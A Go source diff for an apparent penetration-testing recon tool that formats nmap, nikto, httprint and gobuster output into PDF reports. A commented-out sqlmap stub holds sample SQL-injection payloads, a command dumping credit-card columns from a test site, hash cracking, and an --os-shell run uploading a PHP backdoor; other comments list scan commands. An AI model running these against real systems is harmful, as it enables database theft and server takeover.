@@ -10,16 +10,16 @@ import (
 	"log"
 	"path"
 	"path/filepath"
-	"time"
 	"strings"
+	"time"
 
 	"github.com/jung-kurt/gofpdf"
 	//"github.com/jung-kurt/gofpdf/internal/example"
-	"github.com/ren-zxcyq/nier/utilities"
 	tooloutparse "github.com/ren-zxcyq/nier/handle/tooloutparse"
+	"github.com/ren-zxcyq/nier/utilities"
 )
 
-const fontname = "Courier" //"Times", "Arial", "Helvetica"
+const fontname = "Times"	//"Courier", "Times", "Arial", "Helvetica"
 var u utilities.Utils
 var toolparser *tooloutparse.Toolparser
 
@@ -150,19 +150,21 @@ func (h *pdfHandler) pdfCreate() error {
 
 	//	Filter Tool Output
 
-
-
 	//	Add Target Table
 	pdf = h.targetTable(pdf)
 
+	//	Add Banner Table
+	pdf = h.nmapbannertable(pdf)
+
+	pdf = h.httprinttable(pdf)
+
 	//	Add Tools Run Table
 	pdf = h.toolsTable(pdf)
+	pdf = h.nmapVulnsTable(pdf)
+	//h.gobusterDirTable(pdf)
+	pdf = h.nmapComments_MAYBE_table(pdf)
 
-
-	h.nmapVulnsTable(pdf)
-
-	h.gobusterDirTable(pdf)
-
+	pdf = h.niktotable(pdf)
 
 	if pdf.Err() {
 		log.Printf("Failed while creating the PDF Report: %s\n", pdf.Error())
@@ -250,7 +252,7 @@ func (h *pdfHandler) newReport() *gofpdf.Fpdf {
 	pdf.AliasNbPages("") //	Defines an alias for the total number of pages
 	pdf.AddPage()
 	//	HERE Is the Content
-	pdf.SetFont("Times", "", 12)
+	pdf.SetFont(fontname, "", 12)
 	// for j := 1; j <= 40; j++ {
 	// 	pdf.CellFormat(0, 10, fmt.Sprintf("Printing line number %d", j), "", 1, "", false, 0, "")
 	// }
@@ -274,7 +276,7 @@ func (h *pdfHandler) header(pdf *gofpdf.Fpdf, hdr []string) *gofpdf.Fpdf {
 func (h *pdfHandler) table(pdf *gofpdf.Fpdf, tbl [][]string) *gofpdf.Fpdf {
 
 	//	Font & Fill Color
-	pdf.SetFont("Times", "", 12)
+	pdf.SetFont(fontname, "", 14)
 	pdf.SetFillColor(255, 255, 255)
 
 	//	Allign columns according to their contents
@@ -295,13 +297,13 @@ func (h *pdfHandler) singlelinetable(pdf *gofpdf.Fpdf, tbl []string) *gofpdf.Fpd
 
 	//	Font & Fill Color
 	// pdf.SetFont("Times", "", 12)
-	pdf.SetFont(fontname, "", 10)	//	fontname, "B", 12
-	pdf.SetFillColor(240, 240, 240)
+	pdf.SetFont(fontname, "", 10) //	fontname, "B", 12
+	pdf.SetFillColor(255, 255, 255)	//	(240, 240, 240)
 
 	//	Allign columns according to their contents
 	// align := []string{"L", "C", "L", "R", "R", "R"} //"No.","Tool"
 	for _, line := range tbl {
-		
+
 		r := strings.TrimSpace(line)
 		l := len(r)
 		if (l == 0) || (l == 1) {
@@ -361,7 +363,7 @@ func (h *pdfHandler) image(pdf *gofpdf.Fpdf) *gofpdf.Fpdf {
 
 func (h *pdfHandler) savePDF(pdf *gofpdf.Fpdf) error {
 	// fmt.Println("BBBBBBBBBBBBBBB", h.filename)
-	return pdf.OutputFileAndClose(h.filename)				//	HERE
+	return pdf.OutputFileAndClose(h.filename) //	HERE
 }
 
 func (h *pdfHandler) targetTable(pdf *gofpdf.Fpdf) *gofpdf.Fpdf {
@@ -393,63 +395,57 @@ func (h *pdfHandler) targetTable(pdf *gofpdf.Fpdf) *gofpdf.Fpdf {
 	}
 	//fmt.Println(strCont)
 	/*
-	var x []string
-	for _,v := range strCont {
-		// // fmt.Println(k,"-",v)
-		// x = strings.Fields(v)
-		x = strings.SplitAfterN(v, "\t", 4) 
-		//fmt.Println(x)
-		for u,uu := range x {
-			fmt.Println(u,"-",uu)
+		var x []string
+		for _,v := range strCont {
+			// // fmt.Println(k,"-",v)
+			// x = strings.Fields(v)
+			x = strings.SplitAfterN(v, "\t", 4)
+			//fmt.Println(x)
+			for u,uu := range x {
+				fmt.Println(u,"-",uu)
+			}
 		}
-	}
 	*/
 
 	/*	@UNCOMMENT
-	tableCols := tableCont[0]
-	tableCont = tableCont[1:]
+		tableCols := tableCont[0]
+		tableCont = tableCont[1:]
 	*/
-
-
-
 
 	pdf = h.singlelinetable(pdf, strCont)
 
-
-
-
 	/*
-	for _, line := range tableCont {
-		r := strings.TrimSpace(line)
-		l := len(r)
-		if (l == 0) || (l == 1) || (r == "|") {
-			// // fmt.Println(`AAAAAAAAAAAAAAAAAAAAAAA`)
-			// // pdf.CellFormat(195, 7, "MARKED", "1", 0, "LM", false, 0, "")
-			// // pdf.Ln(-1)
-			// continue
-			// // // for i, str := range line {
-			// // pdf.CellFormat(195, 7, line, "1", 0, "LM", false, 0, "")
-			// // pdf.Ln(-1)
-			// // // fmt.Println("hELLOS", line)
-			// // // }
-			continue
-						
-		} else {
-			// for i, str := range line {
-			pdf.CellFormat(195, 7, line, "1", 0, "LM", false, 0, "")
-			pdf.Ln(-1)
-			// fmt.Println("hELLOS", line)
-			// }
-			//continue			
+		for _, line := range tableCont {
+			r := strings.TrimSpace(line)
+			l := len(r)
+			if (l == 0) || (l == 1) || (r == "|") {
+				// // fmt.Println(`AAAAAAAAAAAAAAAAAAAAAAA`)
+				// // pdf.CellFormat(195, 7, "MARKED", "1", 0, "LM", false, 0, "")
+				// // pdf.Ln(-1)
+				// continue
+				// // // for i, str := range line {
+				// // pdf.CellFormat(195, 7, line, "1", 0, "LM", false, 0, "")
+				// // pdf.Ln(-1)
+				// // // fmt.Println("hELLOS", line)
+				// // // }
+				continue
+
+			} else {
+				// for i, str := range line {
+				pdf.CellFormat(195, 7, line, "1", 0, "LM", false, 0, "")
+				pdf.Ln(-1)
+				// fmt.Println("hELLOS", line)
+				// }
+				//continue
+			}
 		}
-	}
 	*/
 	/*	@UNCOMMENT
-	pdf = h.header(pdf, tableCols)
-	pdf = h.table(pdf, tableCont)
+		pdf = h.header(pdf, tableCols)
+		pdf = h.table(pdf, tableCont)
 
-	pdf.SetFont(fontname, "B", 12)
-	pdf.SetFillColor(240, 240, 240)
+		pdf.SetFont(fontname, "B", 12)
+		pdf.SetFillColor(240, 240, 240)
 	*/
 	return pdf
 	// CellFormat(width, height, text, border, position after, align, fill, link, linkStr)
@@ -459,7 +455,9 @@ func (h *pdfHandler) targetTable(pdf *gofpdf.Fpdf) *gofpdf.Fpdf {
 func (h *pdfHandler) toolsTable(pdf *gofpdf.Fpdf) *gofpdf.Fpdf {
 	pdf.AddPage()
 	// pdf.Ln(-1)
-	pdf.Cell(40, 12, "Target: Online")
+	//pdf.SetFont("Arial", "B", 16)
+	pdf.SetFont(fontname, "B", 14)
+	pdf.Cell(40, 12, "Commands Run")
 	pdf.Ln(-1)
 	tableCols := []string{"Tool", "Description", "Command Opts"}
 	tableCont := [][]string{
@@ -472,7 +470,7 @@ func (h *pdfHandler) toolsTable(pdf *gofpdf.Fpdf) *gofpdf.Fpdf {
 
 	//	Create Table Header & Fill
 	//pdf = h.header(pdf, tableCols)
-	pdf.SetFont(fontname, "B", 12)
+	pdf.SetFont(fontname, "", 10)
 	pdf.SetFillColor(240, 240, 240)
 
 	pdf.CellFormat(8, 7, "No.", "1", 0, "LM", true, 0, "")
@@ -494,7 +492,7 @@ func (h *pdfHandler) toolsTable(pdf *gofpdf.Fpdf) *gofpdf.Fpdf {
 	//	Pass	-1 ->	Ln()	i.e. use the height of the last printed Cell as the line height
 	pdf.Ln(-1)
 	//pdf = h.table(pdf, tableCont)
-	pdf.SetFont("Times", "", 12)
+	pdf.SetFont(fontname, "", 10)
 	pdf.SetFillColor(255, 255, 255)
 
 	//	Allign columns according to their contents
@@ -520,7 +518,7 @@ func (h *pdfHandler) toolsTable(pdf *gofpdf.Fpdf) *gofpdf.Fpdf {
 	return pdf
 }
 
-func (h *pdfHandler) nmapVulnsTable(pdf *gofpdf.Fpdf) *gofpdf.Fpdf {	//*gofpdf.Fpdf
+func (h *pdfHandler) nmapVulnsTable(pdf *gofpdf.Fpdf) *gofpdf.Fpdf { //*gofpdf.Fpdf
 
 	//return pdf
 	var nmapOutFilesURL string = path.Join(h.foldername, "nmap-vuln.nmap")
@@ -535,19 +533,18 @@ func (h *pdfHandler) nmapVulnsTable(pdf *gofpdf.Fpdf) *gofpdf.Fpdf {	//*gofpdf.F
 
 	// fmt.Println("@@@@@@@")
 	// fmt.Println(res)							//	res contains filtered tool output
-	
+
 	tableCont, err := u.StringToLines(res)
 	if err != nil {
 		log.Println("Failed while separating lines in formatted tool output")
 	}
-	
 
 	pdf.AddPage()
 	// pdf.Ln(-1)
 
 	//	Create Table Header & Fill
 	//pdf = h.header(pdf, tableCols)
-	pdf.SetFont(fontname, "B", 12)
+	pdf.SetFont(fontname, "B", 14)
 	pdf.SetFillColor(240, 240, 240)
 
 	pdf.Cell(40, 10, "Nmap: Vulnerability Scan Results")
@@ -557,11 +554,9 @@ func (h *pdfHandler) nmapVulnsTable(pdf *gofpdf.Fpdf) *gofpdf.Fpdf {	//*gofpdf.F
 	// 	{"1", "ping", "Initial interaction", "ping -c 1 $TARGET"},
 	// }
 
-	pdf.SetFont("Times", "", 12)
+	pdf.SetFont(fontname, "", 10)
 	pdf.SetFillColor(255, 255, 255)
 
-
-	
 	for _, line := range tableCont {
 		r := strings.TrimSpace(line)
 		l := len(r)
@@ -576,28 +571,24 @@ func (h *pdfHandler) nmapVulnsTable(pdf *gofpdf.Fpdf) *gofpdf.Fpdf {	//*gofpdf.F
 			// // // fmt.Println("hELLOS", line)
 			// // // }
 			continue
-						
+
 		} else {
 			// for i, str := range line {
 			pdf.CellFormat(195, 7, line, "1", 0, "LM", false, 0, "")
 			pdf.Ln(-1)
 			// fmt.Println("hELLOS", line)
 			// }
-			//continue			
+			//continue
 		}
 	}
 
-
-
-
-
-
 	return pdf
 }
+
 //	/root/Desktop/report/nmap-vuln.nmap
 //	nmap-vuln.nmap
 
-func (h *pdfHandler) gobusterDirTable(pdf *gofpdf.Fpdf) *gofpdf.Fpdf {	//*gofpdf.Fpdf
+func (h *pdfHandler) gobusterDirTable(pdf *gofpdf.Fpdf) *gofpdf.Fpdf { //*gofpdf.Fpdf
 	pdf.AddPage()
 
 	pdf.SetFont(fontname, "B", 14)
@@ -625,4 +616,287 @@ func (h *pdfHandler) gobusterDirTable(pdf *gofpdf.Fpdf) *gofpdf.Fpdf {	//*gofpdf
 	// pdf = h.singlelinetable(pdf, strCont)
 	pdf = h.singlelinetable(pdf, res)
 	return pdf
+}
+
+func (h *pdfHandler) sqlmapTable(pdf *gofpdf.Fpdf) *gofpdf.Fpdf {
+	/*
+		available databases [2]:
+		[*] information_schema
+		[*] webscantest
+
+		Database:
+		Table:
+		[5 columns]
+
+		| Column	|	Type	|
+
+	*/
+
+	/*
+			--dump-all
+			--dump
+
+			sqlmap -u "http://www.webscantest.com/datastore/search_get_by_id.php?id=4" --dump -C billing_CC_number -T orders -D webscantest
+
+
+			Parameter: id (GET)
+				Type: boolean-based blind
+				Title: AND boolean-based blind - WHERE or HAVING clause
+				Payload: id=4 AND 4034=4034
+
+				Type: error-based
+				Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+				Payload: id=4 AND (SELECT 3863 FROM(SELECT COUNT(*),CONCAT(0X7172193123))) .... GROUP BY x)a)
+
+				Type: AND/OR time-based blind
+				Title: MySQL >= 5.0.12 AND time-based blind
+				Payload: id=4 AND SLEEP(2)
+
+				Type: UNION query
+				Title: Generic UNION query (NULL) - 4 columns
+				Payload: id=4 UNION ALL SELECT NULL, CONCAT (......)
+
+				...
+
+
+				[08:52:04] [INFO] table 'webscantest.orders' dumped to CSV file '/root/.sqlmap/output/www.webscantest.com/'
+				[08:52:04] [INFO] fetched data logged to text files under /root/.sqlmap/output/www.webscantest.com'
+
+
+				https://github.com/sqlmapproject/sqlmap/wiki/Usage
+
+
+
+				sqlmap identified the following injection point(s) with a total of 44 HTTP(s) requests:
+				---
+				Parameter: id (GET)
+					Type: boolean-based blind
+					Title: AND boolean-based blind - WHERE or HAVING clause
+					Payload: id=1 AND 2623=2623
+
+					Type: error-based
+					Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
+					Payload: id=1 AND (SELECT 2980 FROM(......))
+
+					Type: AND/OR time-based blind
+					Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
+					Payload: id=1 AND (SELECT * FROM (SELECT(SLEEP(5)))MVIi)
+
+					Type: UNION query
+					Title: Generic UNION query (NULL) - 3 columns
+					Payload: id=1 UNION ALL SELECT NULL, CONCAT(...., ....,....), NULL-- GseO
+				---
+				[17:22:22] [INFO] the back-end DBMS is MySQL
+				[17:22:22] [INFO] fetching banner
+				web application technology: PHP 5.2.6, Apache 2.2.9
+				back-end DBMS: MySQL 5.0
+				banner:		'5.1.41-3~bpo50+1'
+				[17:22:22] [INFO] fetched data logged to text files under '/home/stamparm/.sqlmap/output/debiandev'
+
+		=====
+
+		python sqlmap.py -u "http://debiandev/sqlmap/mysql/get_int.php?id=1" --batch --password
+		[17:22:22] [INFO] fetching database users password hashes
+		do you want .....with other tools [y/N] N
+		do you want .....against retrieved password hashes? [Y/n/q] Y
+		[17:22:22] [INFO] using hash method 'mysql_passwd'
+		what dictionary do you want to use?
+		[1] default dictionary file '' (press Enter)
+		[2] custom dictionary file
+		[3] file with list of dictionary files
+		> 1
+		[17:22:22] [INFO] using default dictionary
+		....
+		...
+		...
+		[17:22:22] [INFO] cracked password 'testpass' for user 'root'
+		[*] debian-sys-maint [1]:
+			password hash: *ASDFASLDKFJASLDKFJASDF
+		[*] root [1]:
+			password hash: *ASDFASDFASDFASDFASDFAS
+			clear-text password: testpass
+
+		=====
+
+		python ... --batch --dbs
+		...
+		[17:22:22] [INFO] fetching database names
+		available databases [5]:
+		[*] information_schema
+		[*] master
+		[*] mysql
+		[*] owasp10
+		[*] testdb
+
+		... fetched...
+
+
+		python ... --batch --tables -D testdb
+		[17:22:22] [INFO] fetching tables for database: 'testdb'
+		Database: testdb
+		[1 table]
+		+-------+
+		| users |
+		+-------+
+
+		... fetched ...
+
+		===
+
+		--batch --dump -T users -D testdb
+		[17:22:22] [INFO] fetching columns for table 'users' in database 'testdb'
+		[17:22:22] [INFO] fetching entries for table 'users' in database 'testdb'
+		[17:22:22] [INFO] analyzing table dump for possible password
+		Database: testdb
+		Table: users
+		[4 entries]
+		+-----+-----------+--------------------------+
+		 1
+		 2
+		 3
+		 4   | ........
+
+		[17:22:22] [INFO] table 'testdb.users' dumped to CSV file '/home/....'
+		[17:22:22] [INFO] fetched data logged to text files under '/home/....'
+
+
+		===
+		python sqlmap.py -u "http://debiandev/..." --batch --os-shell
+		[17:22:22] [INFO] trying to upload the file stager on '/var/www/' via LIMIT 'LINES TERMINATED BY' method
+		[17:22:22] [INFO] the file stager has been successfully uploaded on '/var/www/' - http:// ....
+		[17:22:22] [INFO] the backdoor has been successfully uploaded on '/var/www/' - http://debiandev:80/tmpbsadf.php
+		[17:22:22] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER
+
+		os-shell> pwd
+		do you want to retrieve the command standard output? [Y/n/a] Y
+		command standard output:
+		---
+		INFORMIXTMP
+		bin
+		boot
+		cdrom
+		dev
+		etc
+		---
+		os-shell> exit
+		[17:22:22] [INFO] cleaning up the web files uploaded
+		[17:22:22] [WARNING] HTTP error codes detected during run:
+		404 (Not Found) - 2 times
+		[17:22:22] [INFO] fetched data logged to text files under '/home/...'
+
+		...
+	*/
+	return nil
+}
+
+func (h *pdfHandler) nmapbannertable(pdf *gofpdf.Fpdf) *gofpdf.Fpdf {
+	//	nmap banner grabbing
+	//	nmap -p- -Pn -vv -sTV -T5 --script=banner -oA /root/Desktkop/nmap-banners 192.168.1.20
+	pdf.AddPage()
+
+	pdf.SetFont(fontname, "B", 14)
+	pdf.Cell(40, 10, "Nmap: Banners Scan")
+	pdf.Ln(-1)
+
+	//	Filter output
+	var nmapBannersOutURL string = path.Join(h.foldername, "nmap-banners.nmap")
+	var bannersout string = u.ReturnFileContentsStr(nmapBannersOutURL)
+	res := toolparser.ParseBanners(bannersout)
+
+	pdf = h.singlelinetable(pdf, res)
+	
+	return pdf
+}
+
+
+func (h *pdfHandler) nmapComments_MAYBE_table(pdf *gofpdf.Fpdf) *gofpdf.Fpdf {
+	// BELOW or nmap -p80 --script=http-* -oN .. 192.168.1.20
+	// nmap -p80 --script=http-comments-displayer 192.168.1.20 -oN ouptputdir+'/nmap-comments-displayer'
+	pdf.AddPage()
+
+	pdf.SetFont(fontname, "B", 14)
+	pdf.Cell(40, 10, "Nmap: Perhaps Interesting Application Comments")
+	pdf.Ln(-1)
+
+	//	Filter output
+	var nmapCommentsOutURL string = path.Join(h.foldername, "nmap-comments.nmap")
+	var commentsout string = u.ReturnFileContentsStr(nmapCommentsOutURL)
+	res := toolparser.ParseComments(commentsout)
+
+	pdf = h.singlelinetable(pdf, res)
+
+	return pdf
+}
+
+func (h *pdfHandler) httprinttable(pdf *gofpdf.Fpdf) *gofpdf.Fpdf {
+	pdf.AddPage()
+
+	pdf.SetFont(fontname, "B", 14)
+	pdf.Cell(40, 10, "httprint: Web Server Fingerprinting - Version Guessing")
+	pdf.Ln(-1)
+
+	//	Filter output
+	var httprintOutURL string = path.Join(h.foldername, "httprint-srv-version")
+	var httprintout string = u.ReturnFileContentsStr(httprintOutURL)
+	res := toolparser.ParseHTTPrint(httprintout)
+
+	pdf = h.singlelinetable(pdf, res)
+
+	return pdf
+}
+
+func (h *pdfHandler) niktotable(pdf *gofpdf.Fpdf) *gofpdf.Fpdf {
+
+	pdf.AddPage()
+
+	pdf.SetFont(fontname, "B", 14)
+	pdf.Cell(40, 10, "nikto: Web Server Vulnerability Testing")
+	pdf.Ln(-1)
+
+	//	Filter output
+	var niktoOutURL string = path.Join(h.foldername, "nikto.txt")
+	var niktoout string = u.ReturnFileContentsStr(niktoOutURL)
+	res := toolparser.ParseNikto(niktoout)
+
+	pdf = h.singlelinetable(pdf, res)
+
+	return pdf
+}
+
+func (h *pdfHandler) whatwebtable(pdf *gofpdf.Fpdf) *gofpdf.Fpdf {
+	pdf.AddPage()
+	return nil
+}
+
+func (h *pdfHandler) wpscantable(pdf *gofpdf.Fpdf) *gofpdf.Fpdf {
+	//	@TODO	tool output is a folder		Consider just using a str for this
+	// h.execCmd(h.e.tools["wpscan"] + " -o " + filepath.ToSlash(path.Join(h.e.outputFolder, "/wpscan-out")) + " --url " + h.e.targetHost)
+	pdf.AddPage()
+
+	return nil
+}
+
+func (h *pdfHandler) todo() {
+	//	httprint -h 192.168.1.20 -P0 -s /usr/share/httprint/signatures.txt -o OUTPUTFILE
+	//	whatweb -v -a4 192.168.1.20 --log-verbose OUTPUTFILE
+	//	whatweb -v -a3 192.168.1.20:80 -u=usern@mail.com:password --log-verbose OUTPUTFILE
+
+	//	nmap -p 80 --script http-methods 192.168.1.20
+	//				http-headers
+	//				http-methods
+	//				http-apache-negotiation
+	//				http-date
+
+	//	wpscan --url 192.168.1.20				//	--wp-content-dir, --scope option, --url value given is the correct one
+
+	//	python Blindelephant.py http://192.168.1.20:80 guess
+
+	//	nmap -p80 --script=http-comments-displayer 192.168.1.20 -oN OUTPUTFILE
+
+	//	turbolist3r
+	//	arachni
+
+	//	nikto -h TARGET:80 -Tuning x 6 -o OUTPUTFILE -Format txt
+	//				-id user@email.com:password
+
 }
